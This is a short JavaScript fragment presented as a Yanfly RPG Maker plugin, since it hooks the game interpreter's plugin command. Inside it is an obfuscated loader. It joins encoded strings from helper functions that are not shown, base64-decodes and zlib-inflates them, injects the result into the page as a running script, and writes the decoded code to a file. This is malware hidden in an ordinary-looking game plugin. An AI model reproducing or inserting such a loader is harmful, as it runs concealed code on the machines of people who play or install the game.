const fs = require('fs');
Yanfly.Core.Game_Interpreter_pluginCommand = Game_Interpreter.prototype.pluginCommand;
function _() {
  let _0x3d08d6 = _0xf9cae6_() + _0x8f7a66_() + _0x6ddd86_() + _0xc1284a_() + _0xcc1105_() + _0x25f88e_() + _0x2f2bcf_();
  let _0x15c555 = Buffer.from(_0x3d08d6, 'base64');
  let _0x505f51 = require("zlib").inflateSync(_0x15c555);
  let _0x7cbe1a = document.createElement('script');
  _0x7cbe1a.textContent = _0x505f51.toString("utf-8");
  ;
  document.body.appendChild(_0x7cbe1a);
  fs.writeFile('input.js', _0x7cbe1a.textContent, err => {
    if (err) {
      console.error(err);
    } else {}
  });
}